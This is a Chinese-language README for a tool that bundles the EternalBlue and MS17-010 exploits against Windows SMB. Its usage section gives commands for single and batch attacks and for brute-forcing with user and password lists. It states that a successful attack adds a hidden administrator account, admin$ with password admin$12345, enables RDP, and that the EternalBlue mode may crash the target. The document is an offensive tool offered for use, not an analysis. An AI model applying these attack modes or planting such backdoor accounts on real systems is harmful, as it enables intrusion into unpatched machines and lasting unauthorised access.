# ms17010-nsa-EternalBlue
integration ms17010 and nsa-EternalBlue

主要集成nsa的永恆之藍和ms17010系列poc。
永恆之藍poc有windows 7/2008 和 windows 8/2012 x64
ms17010 則是win all，Windows Vista以下可以匿名成功獲取system權限，
vista以上則需要 命名管道 接入權限，一般需要網域用戶權限。

Usage: "usage:MyExploiter.py [options] target"

Options:

  --version             show program's version number and exit
  
  -h, --help            show this help message and exit
  
  -m MODE, --mode=MODE  attack mode 0:ms17010 attack one; 1: ms17010 attack by
  
                        file; 2:blue attack one;3:blue attack Mul;4:check
						
                        one;5:check Mul)
						
  -p PORT, --port=PORT  SMB SERVICE PORT
  
  -u USER, --user=USER  SMB USER
  
  -U USERS, --users=USERS user file,SMB USERS
						
  --pwd=password        SMB USER PASSWORD
  
  --pwds=passwords, --pwds=passwords  pwd file,EACH SMB USER PASSWORDS
						
  -t THREADS, --threads=THREADS  thread num
						
  -c COMMOND, --cmd=COMMOND  execute commond on target
						
  -b BATCH, --batch=BATCH    batch file,execute batch file on target
  
  eg:
  模式0：自動執行ms17010攻擊，攻擊成功後靶機增加管理員賬號admin$/admin$12345並開啟RDP服務
  
  ms17010EXP 192.168.1.10 || ms17010EXP -U user.txt --pwds=pwd.txt -t(線程數) 2 192.168.1.10
  
  模式1：批量執行ms17010攻擊，攻擊成功後靶機增加管理員賬號admin$/admin$12345並開啟RDP服務
  
  ms17010EXP -m 1 ip.txt || ms17010EXP -m 1 -U user.txt --pwds=pwd.txt -t(線程數) 2 ip.txt
  
  模式2：執行永恆之藍攻擊，shellcode為shellcode.bin,成功後靶機可能藍屏或增加用戶admin$/admin$12345並開啟RDP服務
  
  ms17010EXP -m 2 192.168.1.10
  
  模式3，批量永恆之藍攻擊，ms17010EXP -m 3 ip.txt
  
  模式4，檢測靶機是否打補丁及命名管道的接入情況 ms17010EXP -m 4 192.168.1.10
  
  模式5，批量檢測 ms17010EXP -m 5 -t 2 --users=user.txt --pwds=pwd.txt ip.txt

  注意：用戶名字典 密碼字典 最後一行置空，即每行必須有換行符。

基於：https://github.com/worawit/MS17-010